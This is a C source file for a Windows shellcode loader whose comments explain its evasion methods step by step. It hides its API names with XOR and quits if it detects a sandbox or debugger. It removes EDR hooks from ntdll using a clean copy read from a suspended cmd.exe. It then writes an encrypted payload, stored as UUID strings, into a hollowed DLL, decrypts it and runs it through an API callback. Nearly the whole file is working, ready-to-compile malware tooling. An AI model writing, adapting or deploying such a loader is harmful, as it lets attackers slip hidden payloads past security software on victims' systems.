
#include <Windows.h>
#include <TlHelp32.h>
#include <Rpc.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <tchar.h>

#pragma comment (lib, "Rpcrt4.lib")

#define GETIMAGESIZE(x) (x->pNtHdr->OptionalHeader.SizeOfImage)
#define GETMODULEBASE(x) ((PVOID)x->pDosHdr)
#define STARTSWITHA(x1, x2) ((strlen(x2) > strlen(x1)) ? FALSE : ((BOOL)RtlEqualMemory(x1, x2, strlen(x2))))
#define ENDSWITHW(x1, x2) ((wcslen(x2) > wcslen(x1)) ? FALSE : ((BOOL)RtlEqualMemory(x1 + wcslen(x1) - wcslen(x2), x2, wcslen(x2))))

#if defined(_WIN64)
#define SYSCALLSIZE 0x20
#else
#define SYSCALLSIZE 0x10
#endif

#define KEY 0xf7
#define KEYSIZE sizeof(decKey) - 1
#define SHELLSIZE 0x129


typedef struct
{
    PIMAGE_DOS_HEADER pDosHdr;
    PIMAGE_NT_HEADERS pNtHdr;
    PIMAGE_EXPORT_DIRECTORY pExpDir;
    PIMAGE_SECTION_HEADER pTextSection;
} IMAGE, *PIMAGE;


/* PEB structures redefintion */
typedef struct _UNICODE_STR
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR pBuffer;
} UNICODE_STR, *PUNICODE_STR;

typedef struct _PEB_LDR_DATA
{
    DWORD dwLength;
    DWORD dwInitialized;
    LPVOID lpSsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    LPVOID lpEntryInProgress;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STR FullDllName;
    UNICODE_STR BaseDllName;
    ULONG Flags;
    SHORT LoadCount;
    SHORT TlsIndex;
    LIST_ENTRY HashTableEntry;
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_FREE_BLOCK
{
    struct _PEB_FREE_BLOCK *pNext;
    DWORD dwSize;
} PEB_FREE_BLOCK, *PPEB_FREE_BLOCK;

typedef struct __PEB
{
    BYTE bInheritedAddressSpace;
    BYTE bReadImageFileExecOptions;
    BYTE bBeingDebugged;
    BYTE bSpareBool;
    LPVOID lpMutant;
    LPVOID lpImageBaseAddress;
    PPEB_LDR_DATA pLdr;
    LPVOID lpProcessParameters;
    LPVOID lpSubSystemData;
    LPVOID lpProcessHeap;
    PRTL_CRITICAL_SECTION pFastPebLock;
    LPVOID lpFastPebLockRoutine;
    LPVOID lpFastPebUnlockRoutine;
    DWORD dwEnvironmentUpdateCount;
    LPVOID lpKernelCallbackTable;
    DWORD dwSystemReserved;
    DWORD dwAtlThunkSListPtr32;
    PPEB_FREE_BLOCK pFreeList;
    DWORD dwTlsExpansionCounter;
    LPVOID lpTlsBitmap;
    DWORD dwTlsBitmapBits[2];
    LPVOID lpReadOnlySharedMemoryBase;
    LPVOID lpReadOnlySharedMemoryHeap;
    LPVOID lpReadOnlyStaticServerData;
    LPVOID lpAnsiCodePageData;
    LPVOID lpOemCodePageData;
    LPVOID lpUnicodeCaseTableData;
    DWORD dwNumberOfProcessors;
    DWORD dwNtGlobalFlag;
    LARGE_INTEGER liCriticalSectionTimeout;
    DWORD dwHeapSegmentReserve;
    DWORD dwHeapSegmentCommit;
    DWORD dwHeapDeCommitTotalFreeThreshold;
    DWORD dwHeapDeCommitFreeBlockThreshold;
    DWORD dwNumberOfHeaps;
    DWORD dwMaximumNumberOfHeaps;
    LPVOID lpProcessHeaps;
    LPVOID lpGdiSharedHandleTable;
    LPVOID lpProcessStarterHelper;
    DWORD dwGdiDCAttributeList;
    LPVOID lpLoaderLock;
    DWORD dwOSMajorVersion;
    DWORD dwOSMinorVersion;
    WORD wOSBuildNumber;
    WORD wOSCSDVersion;
    DWORD dwOSPlatformId;
    DWORD dwImageSubsystem;
    DWORD dwImageSubsystemMajorVersion;
    DWORD dwImageSubsystemMinorVersion;
    DWORD dwImageProcessAffinityMask;
    DWORD dwGdiHandleBuffer[34];
    LPVOID lpPostProcessInitRoutine;
    LPVOID lpTlsExpansionBitmap;
    DWORD dwTlsExpansionBitmapBits[32];
    DWORD dwSessionId;
    ULARGE_INTEGER liAppCompatFlags;
    ULARGE_INTEGER liAppCompatFlagsUser;
    LPVOID lppShimData;
    LPVOID lpAppCompatInfo;
    UNICODE_STR usCSDVersion;
    LPVOID lpActivationContextData;
    LPVOID lpProcessAssemblyStorageMap;
    LPVOID lpSystemDefaultActivationContextData;
    LPVOID lpSystemAssemblyStorageMap;
    DWORD dwMinimumStackCommit;
} _PEB, *_PPEB;


typedef HANDLE(WINAPI *CreateFileAFunc)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL(WINAPI *CreateProcessAFunc)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL(WINAPI *ReadProcessMemoryFunc)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T *);
typedef BOOL(WINAPI *TerminateProcessFunc)(HANDLE, UINT);
typedef LPVOID(WINAPI *VirtualAllocFunc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef LPVOID(WINAPI *VirtualProtectFunc)(LPVOID, SIZE_T, DWORD, PDWORD);


DWORD g_dwNumberOfHooked = 0;

char cLib1Name[] = { 0x9c, 0x92, 0x85, 0x99, 0x92, 0x9b, 0xc4, 0xc5, 0xd9, 0x93, 0x9b, 0x9b, 0x0 };
char cLib2Name[] = { 0x9a, 0x84, 0x9f, 0x83, 0x9a, 0x9b, 0xd9, 0x93, 0x9b, 0x9b, 0x0 };
char cCreateFileA[] = { 0xb4, 0x85, 0x92, 0x96, 0x83, 0x92, 0xb1, 0x9e, 0x9b, 0x92, 0xb6, 0x0 };
char cCreateProcessA[] = { 0xb4, 0x85, 0x92, 0x96, 0x83, 0x92, 0xa7, 0x85, 0x98, 0x94, 0x92, 0x84, 0x84, 0xb6, 0x0 };
char cReadProcessMemory[] = { 0xa5, 0x92, 0x96, 0x93, 0xa7, 0x85, 0x98, 0x94, 0x92, 0x84, 0x84, 0xba, 0x92, 0x9a, 0x98, 0x85, 0x8e, 0x0 };
char cTerminateProcess[] = { 0xa3, 0x92, 0x85, 0x9a, 0x9e, 0x99, 0x96, 0x83, 0x92, 0xa7, 0x85, 0x98, 0x94, 0x92, 0x84, 0x84, 0x0 };
char cVirtualAlloc[] = { 0xa1, 0x9e, 0x85, 0x83, 0x82, 0x96, 0x9b, 0xb6, 0x9b, 0x9b, 0x98, 0x94, 0x0 };
char cVirtualProtect[] = { 0xa1, 0x9e, 0x85, 0x83, 0x82, 0x96, 0x9b, 0xa7, 0x85, 0x98, 0x83, 0x92, 0x94, 0x83, 0x0 };

char decKey[] = { 0xae, 0x98, 0x82, 0xd7, 0x96, 0x85, 0x92, 0xd7, 0x96, 0x99, 0xd7, 0x92, 0x9b, 0x9e, 0x83, 0x92, 0xd7, 0x9f, 0x96, 0x94, 0x9c, 0x92, 0x85, 0xd6, 0x0 };

const char *uuids[] = {
        "f9ee8480-5615-1191-b3dc-5754a50dff14",
        "6f17e310-13e0-aa6e-1f67-fe5e41f95318",
        "9655762e-6835-9aa5-c108-ea0f4f41f964",
        "0821e465-7319-ab8f-2b76-ab3f4c689f86",
        "57ea2114-64e0-109c-a65e-b5dccdf6a554",
        "68efaf66-ae6d-919f-1b14-454b1e84f97b",
        "469e6e7d-7eea-ab2e-3b72-218ee76dff64",
        "4725e1c8-0477-93b1-5146-a1a984fba748",
        "892e20ef-813e-9aeb-df97-e8266fde0cf9",
        "3cf21cbb-2045-ae8d-9e91-dfec29611c09",
        "0b20484c-5758-455c-311a-06451342bea8",
        "ec2a4a3d-3f8a-308b-24e1-a333d0cdd06c",
        "0469e8e5-9a33-df3a-9e91-48173449540d",
        "060a096d-2d03-4d17-355e-aea83d566ca9",
        "44010682-4934-001c-4448-400b04081b52",
        "50180031-1a13-4e00-410d-48164c0b110d",
        "02094852-1503-5507-3c07-55430e1f0d79",
        "54521b0e-e1a5-4138-06e1-8052b9372170",
        "11a5900b-22a1-759a-6990-909090909090"
};

unsigned char *pShell; 


CreateFileAFunc pCreateFileAFunc;
CreateProcessAFunc pCreateProcessAFunc;
ReadProcessMemoryFunc pReadProcessMemoryFunc;
TerminateProcessFunc pTerminateProcessFunc;
VirtualAllocFunc pVirtualAllocFunc;
VirtualProtectFunc pVirtualProtectFunc;


_PPEB GetPEB()
{
    /* 
        Get Process Environment Block without call any winapi like NtQueryInformationProcess, 
        By reading fs/gs registers, read the link below to know more about what is these registers.
        => https://stackoverflow.com/questions/10810203/what-is-the-fs-gs-register-intended-for
    */
#if defined(_WIN64)
    /*
        ; mov rax, gs:[60h]
    */
    return (_PPEB)__readgsqword(0x60);
#else
    /*
        ; mov eax, fs:[30h]
    */
    return (_PPEB)__readfsdword(0x30);
#endif
}

PVOID FindNtDLL(_PPEB pPEB)
{
    /*
        Parse Process Environment Block and obtaine ntdll base address from it,
        Very useful resource about PEB => https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/exploring-process-environment-block
    */
    PVOID pDllBase = NULL;

    /* Get LoaDeR data structure which contains information about all of the loaded modules */
    PPEB_LDR_DATA pLdr = pPEB->pLdr;
    PLDR_DATA_TABLE_ENTRY pLdrData;
    PLIST_ENTRY pEntryList = &pLdr->InMemoryOrderModuleList;
    
    /* Walk through module list */
    for (PLIST_ENTRY pEntry = pEntryList->Flink; pEntry != pEntryList; pEntry = pEntry->Flink)
    {
        pLdrData = (PLDR_DATA_TABLE_ENTRY)pEntry;

        /* If the module ends with ntdll.dll, get its base address */
        if (ENDSWITHW(pLdrData->FullDllName.pBuffer, L"ntdll.dll"))
        {
            pDllBase = (PVOID)pLdrData->DllBase;
            break;
        }

    }
    
    return pDllBase;
}


PIMAGE ParseImage(PBYTE pImg)
{
    /*
        You can read these resources to know more about PEs
        Intro => https://resources.infosecinstitute.com/topic/2-malware-researchers-handbook-demystifying-pe-file/
        Detailed => https://learn.microsoft.com/en-us/windows/win32/debug/pe-format
    */
    PIMAGE pParseImg;

    /* Allocate memory space for the image */
    if (!(pParseImg = (PIMAGE) malloc(sizeof(IMAGE))))
    {
        return NULL;
    }

    /* Parse DOS Header */
    pParseImg->pDosHdr = (PIMAGE_DOS_HEADER)pImg;

    /* Check if we parse a valid image or not */
    if (pParseImg->pDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
    {
        /* 
            This isn't a valid image,
            Every image has a fixed magic number ==> 0x5a4d
        */

        free(pParseImg);
        return NULL;
    }

    /* Parse NT Header */
    pParseImg->pNtHdr = (PIMAGE_NT_HEADERS)((DWORD_PTR)pImg + pParseImg->pDosHdr->e_lfanew);
	
    /* Check if this is the NT header or not */
    if (pParseImg->pNtHdr->Signature != IMAGE_NT_SIGNATURE)
    {
        free(pParseImg);
        return NULL;
    }
	
    /* Parse Export Directory */
    pParseImg->pExpDir = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)pImg + pParseImg->pNtHdr->OptionalHeader.DataDirectory[0].VirtualAddress);
	
    /* Parse .text section, it's a first section */
    pParseImg->pTextSection = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pParseImg->pNtHdr);
	
    return pParseImg;
}

PVOID GetFreshCopy(PIMAGE pHookedImg)
{
    /*
        Create a suspended process and retrieve a fresh copy from it
        Before get hooked by AV/EDRs.

        => https://blog.sektor7.net/#!res/2021/perunsfart.md
    */

    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOA si = { 0 };
    PVOID pDllBase;
    SIZE_T nModuleSize, nBytesRead = 0;

    if (
        !pCreateProcessAFunc(
        NULL, 
        (LPSTR)"cmd.exe", 
        NULL, 
        NULL, 
        FALSE, 
        CREATE_SUSPENDED | CREATE_NEW_CONSOLE, 
        NULL, 
        (LPCSTR)"C:\\Windows\\System32\\", 
        &si, 
        &pi)
    )
        return NULL;

    nModuleSize = GETIMAGESIZE(pHookedImg);

    /* Allocate Memory for the fresh copy */
    if (!(pDllBase = (PVOID)pVirtualAllocFunc(NULL, nModuleSize, MEM_COMMIT, PAGE_READWRITE)))
        return NULL;

    /* Read a fresh copy from the process */
    if (!pReadProcessMemoryFunc(pi.hProcess, (LPCVOID)GETMODULEBASE(pHookedImg), pDllBase, nModuleSize, &nBytesRead))
        return NULL;

    /* We don't need the process anymore */
    pTerminateProcessFunc(pi.hProcess, 0);

    return pDllBase;
}

PVOID FindEntry(PIMAGE pFreshImg, PCHAR cFunctionName) {
    /* Get needed information from the Export Directory */
    PDWORD pdwAddrOfFunctions = (PDWORD)((PBYTE)GETMODULEBASE(pFreshImg) + pFreshImg->pExpDir->AddressOfFunctions);
    PDWORD pdwAddrOfNames = (PDWORD)((PBYTE)GETMODULEBASE(pFreshImg) + pFreshImg->pExpDir->AddressOfNames);
    PWORD pwAddrOfNameOrdinales = (PWORD)((PBYTE)GETMODULEBASE(pFreshImg) + pFreshImg->pExpDir->AddressOfNameOrdinals);

    for (WORD idx = 0; idx < pFreshImg->pExpDir->NumberOfNames; idx++) {
        PCHAR cFuncName = (PCHAR)GETMODULEBASE(pFreshImg) + pdwAddrOfNames[idx];
        PBYTE pFuncAddr = (PBYTE)GETMODULEBASE(pFreshImg) + pdwAddrOfFunctions[pwAddrOfNameOrdinales[idx]];

        if (strcmp(cFuncName, cFunctionName) == 0)
        {
#if defined(_WIN64)
            WORD wCtr = 0;

            while(TRUE)
            {
                /* If we reach syscall instruction before --> <mov r10, rcx> */
                if (RtlEqualMemory(pFuncAddr + wCtr, "\x0f\x05", 2))
                    break;
            
                /* ret instruction (the end of the syscall) */
                if (*(pFuncAddr + wCtr) == 0xc3)
                    break;

                /*
                  Syscalls starts with the following instrucions
                  ; mov r10, rcx
                  ; mov eax, ...

                  If we reach this pattern, this is what we search about.
                */
                if (RtlEqualMemory(pFuncAddr + wCtr, "\x4c\x8b\xd1\xb8", 4) && 
                    RtlEqualMemory(pFuncAddr + wCtr + 6, "\x00\x00", 2)
                )
                {
                    return pFuncAddr;
                }

                wCtr++;
            }
#else
            if (STARTSWITHA(cFuncName, "Nt") || STARTSWITHA(cFuncName, "Zw"))
                return pFuncAddr;
#endif

        }
    }

    return NULL;
}

BOOL IsHooked(PVOID pAPI)
{
    /* If the first syscall instruction was jmp, it's hooked */
    if (*((PBYTE)pAPI) == 0xe9)
    {
        g_dwNumberOfHooked++;
        return TRUE;
    }

    return FALSE;
}

BOOL RemoveHooks(PIMAGE pHookedImg, PIMAGE pFreshImg)
{
    PCHAR cFuncName;
    PBYTE pFuncAddr;
    PVOID pFreshFuncAddr;
    DWORD dwOldProtect = 0;

    /* Get the Addresses of the functions and names from Export Directory */
    PDWORD pdwAddrOfFunctions = (PDWORD)((PBYTE)GETMODULEBASE(pHookedImg) + pHookedImg->pExpDir->AddressOfFunctions);
    PDWORD pdwAddrOfNames = (PDWORD)((PBYTE)GETMODULEBASE(pHookedImg) + pHookedImg->pExpDir->AddressOfNames);
    PWORD pwAddrOfNameOrdinales = (PWORD)((PBYTE)GETMODULEBASE(pHookedImg) + pHookedImg->pExpDir->AddressOfNameOrdinals);

    /* Change page permission of .text section to patch it */
    if (!pVirtualProtectFunc((LPVOID)((DWORD_PTR)GETMODULEBASE(pHookedImg) + pHookedImg->pTextSection->VirtualAddress), pHookedImg->pTextSection->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &dwOldProtect))
        return FALSE;

    for (WORD idx = 0; idx < pHookedImg->pExpDir->NumberOfNames; idx++)
    {
        cFuncName = (PCHAR)GETMODULEBASE(pHookedImg) + pdwAddrOfNames[idx];
        pFuncAddr = (PBYTE)GETMODULEBASE(pHookedImg) + pdwAddrOfFunctions[pwAddrOfNameOrdinales[idx]];

        /* Get only Nt/Zw APIs */
        if (STARTSWITHA(cFuncName, "Nt") || STARTSWITHA(cFuncName, "Zw"))
        {
#if defined(_WIN64)
            /* Exclude these APIs, because they have a jmp instruction */
            if (RtlEqualMemory(cFuncName, "NtQuerySystemTime", 18) || RtlEqualMemory(cFuncName, "ZwQuerySystemTime", 18))
                continue;
#endif

            if (IsHooked(pFuncAddr))
            {
                /* Find the clean syscall from the fresh copy, to patch the hooked syscall */
                if ((pFreshFuncAddr = FindEntry(pFreshImg, cFuncName)) != NULL)
                    /* Patch it */
                    RtlCopyMemory(pFuncAddr, pFreshFuncAddr, SYSCALLSIZE);					
	
            }
        }
    }

    /* Back the old permission */
    if (!pVirtualProtectFunc((LPVOID)((DWORD_PTR)GETMODULEBASE(pHookedImg) + pHookedImg->pTextSection->VirtualAddress), pHookedImg->pTextSection->Misc.VirtualSize, dwOldProtect, &dwOldProtect))
        return FALSE;

	
    return TRUE;
}

BOOL UnHookNtDLL(PVOID pNtDLL)
{
    PVOID pFreshNtDLL;
    PIMAGE pHookedImg, pFreshImg;
    BOOL bRet;

    /* Parse ntdll */
    if (!(pHookedImg = ParseImage((PBYTE)pNtDLL)))
        return FALSE;

    /* Get a clean copy of ntdll.dll */
    if (!(pFreshNtDLL = GetFreshCopy(pHookedImg)))
        return FALSE;

    /* Parse the fresh copy */
    if (!(pFreshImg = ParseImage((PBYTE)pFreshNtDLL)))
        return FALSE;

    /* Remove hooks from hooked syscalls one by one */
    bRet = RemoveHooks(pHookedImg, pFreshImg);

    /* Deallocate memory */
    free(pHookedImg);
    free(pFreshImg);

    return bRet;
}


BOOL FindProcById(DWORD dwProcId, PROCESSENTRY32 *pe32)
{

    HANDLE hSnapshot;
    BOOL bSuccess = FALSE;

    if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) != INVALID_HANDLE_VALUE)
    {
        pe32->dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, pe32)) 
        {
            do {
                if (pe32->th32ProcessID == dwProcId)
                {
                    bSuccess = TRUE;
                    break;
                }
            } while (Process32Next(hSnapshot, pe32));
        }

        CloseHandle(hSnapshot);
    } 

    return bSuccess;
}


void deObfuscateData(char *data)
{
    for (int idx = 0; idx < strlen(data); idx++)
    {
        data[idx] = data[idx] ^ KEY;
    }
    
}

void deObfuscateAll()
{
    deObfuscateData(decKey);
    deObfuscateData(cLib1Name);
    deObfuscateData(cLib2Name);
    deObfuscateData(cCreateFileA);
    deObfuscateData(cCreateProcessA);
    deObfuscateData(cReadProcessMemory);
    deObfuscateData(cTerminateProcess);
    deObfuscateData(cVirtualAlloc);
    deObfuscateData(cVirtualProtect);
}

void decShell()
{
    for (int idx = 0, ctr = 0; idx < SHELLSIZE; idx++)
    {
        ctr = (ctr == KEYSIZE) ? 0 : ctr;
        pShell[idx] = pShell[idx] ^ decKey[ctr++];
    }

}

int _tmain(int argc, TCHAR **argv)
{  
    _PPEB pPEB;
    PVOID pNtDLL;
    DWORD_PTR pFuncAddr, pShellReader;
    DWORD dwOldProtect = 0;
    HMODULE hModule, hModule2;
    char *pMem;
    int nMemAlloc, nCtr = 0;
    PROCESSENTRY32 pe32;

    if (FindProcById(GetCurrentProcessId(), &pe32))
    {
        _tprintf(TEXT("Current pid = %d, exename = %s\n"), pe32.th32ProcessID, pe32.szExeFile);
        printf("We found the parent proccess id -> %d\n", pe32.th32ParentProcessID);

        if (FindProcById(pe32.th32ParentProcessID, &pe32))
        {
            _tprintf(TEXT("The parent process is %s\n"), pe32.szExeFile);

            /* We expect that will be run from cmd or powershell, else maybe we're inside sandbox */
            if (!(_tcscmp(pe32.szExeFile, TEXT("cmd.exe")) == 0 || _tcscmp(pe32.szExeFile, TEXT("powershell.exe")) == 0))
                return EXIT_FAILURE;
        }
    }

    puts("Deobfuscate all (APIs, Libraries, Decryption key)");
    deObfuscateAll();

    /* Load needed libs */
    if (!(
        (hModule = LoadLibraryA((LPCSTR)cLib1Name)) &&
        (hModule2 = LoadLibraryA((LPCSTR)cLib2Name))
    )) {
        return EXIT_FAILURE;
    }

    /* Get the Addresses of the APIs */
    if (!(
        (pCreateFileAFunc = (CreateFileAFunc) GetProcAddress(hModule, cCreateFileA)) &&
        (pCreateProcessAFunc = (CreateProcessAFunc) GetProcAddress(hModule, cCreateProcessA)) &&
        (pReadProcessMemoryFunc = (ReadProcessMemoryFunc) GetProcAddress(hModule, cReadProcessMemory)) &&
        (pTerminateProcessFunc = (TerminateProcessFunc) GetProcAddress(hModule, cTerminateProcess)) &&
        (pVirtualAllocFunc = (VirtualAllocFunc) GetProcAddress(hModule, cVirtualAlloc)) &&
        (pVirtualProtectFunc = (VirtualProtectFunc) GetProcAddress(hModule, cVirtualProtect))
    )) {
        return EXIT_FAILURE;
    }

    /* Check for a non-exist file, if found it we're inside sandbox */
    if (pCreateFileAFunc(cLib2Name, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, NULL) != INVALID_HANDLE_VALUE)
    {
        return EXIT_FAILURE;
    }

    pPEB = GetPEB();
    
    /* Check if the process under debugger */
    if (pPEB->bBeingDebugged)
    {
        puts("The current process running under debugger");
        return EXIT_FAILURE;
    }

    /* 
        Move key bits to left, let's say the key is 0xfa,
        Will represented as following in memory :
            -> 00000000 00000000 00000000 11111010

        After moving will be :
            -> 00001111 10100000 00000000 00000000

        That's a very large number.
    */
    nMemAlloc = KEY << 20;

    /* Ask os for very large memory, if fail maybe we're inside sandbox */
    if (!(pMem = (char *) malloc(nMemAlloc)))
    {
        return EXIT_FAILURE;
    }

    /* Make large iterations */
    for (int idx = 0; idx < nMemAlloc; idx++)
    {
        /* Count every iteration one by one */
        pMem[nCtr++] = 0x00;
    }
    
    /* If number of iterations and the counter isn't same, we're inside sandbox */
    if (nMemAlloc != nCtr)
    {
        return EXIT_FAILURE;
    }

    /* Deallocate memory */
    free(pMem);

    puts("Try to find ntdll.dll base address from PEB, without call GetModuleHandle/LoadLibrary");
    if(!(pNtDLL = FindNtDLL(pPEB)))
    {
        puts("Could not find ntdll.dll");
        return EXIT_FAILURE;
    }

    printf("ntdll base address = %p\n", pNtDLL);

    puts("Try to unhook ntdll");
    if (!UnHookNtDLL(pNtDLL))
    {
        puts("Something goes wrong in UnHooking phase");
        return EXIT_FAILURE;
    }

    if (g_dwNumberOfHooked != 0)
        printf("There were %d hooked syscalls\n", g_dwNumberOfHooked);

    else
        puts("There are no hooked syscalls");

    /* 
        DLL hollowing to bypass memory monitoring.
        Useful resource --> https://www.ired.team/offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection
        DLL Base Addr + 0x1000 = RWX section.
        We can parse it and obtain the same result.
    */
    pFuncAddr = (DWORD_PTR) hModule2 + 0x1000;

    /* Shell will point to the hollowed address */
    pShell = (unsigned char *) pFuncAddr;

    /* This will read shellcode from UUIDs, and reflect it in the hollowed DLL directly */
    pShellReader = (DWORD_PTR) pShell;

    printf("Shellcode will be written at %p\n", pShell);

    /* Change permission of the section, to overwrite it */
    if (pVirtualProtectFunc((LPVOID)pFuncAddr, SHELLSIZE, PAGE_READWRITE, &dwOldProtect) == 0)
    {
        return EXIT_FAILURE;
    }

    puts("Deobfuscate UUIDs, and obtain encrypted shellcode from it");

    for (int idx = 0; idx < sizeof(uuids) / sizeof(PCHAR); idx++)
    {
        if (UuidFromStringA((RPC_CSTR)uuids[idx], (UUID *)pShellReader) == RPC_S_INVALID_STRING_UUID)
        {
            return EXIT_FAILURE;
        }
        
        /* We have read 16 byte (The size of each UUID), let's move to the next memory space */
        pShellReader += 0x10;
    }

    puts("Decrypt shellcode");
    decShell();
    
    /* Back the old permission */
    if (pVirtualProtectFunc((LPVOID)pFuncAddr, SHELLSIZE, dwOldProtect, &dwOldProtect) == 0)
    {
        return EXIT_FAILURE;
    }

    puts("Inject shellcode, without creating a new thread");

    /* 
        No new thread payload execution, 
        Creating a new thread is a bad thing (can be monitored by EDRs)
    */
    return EnumSystemLocalesA((LOCALE_ENUMPROCA)pFuncAddr, LCID_SUPPORTED) != 0;

}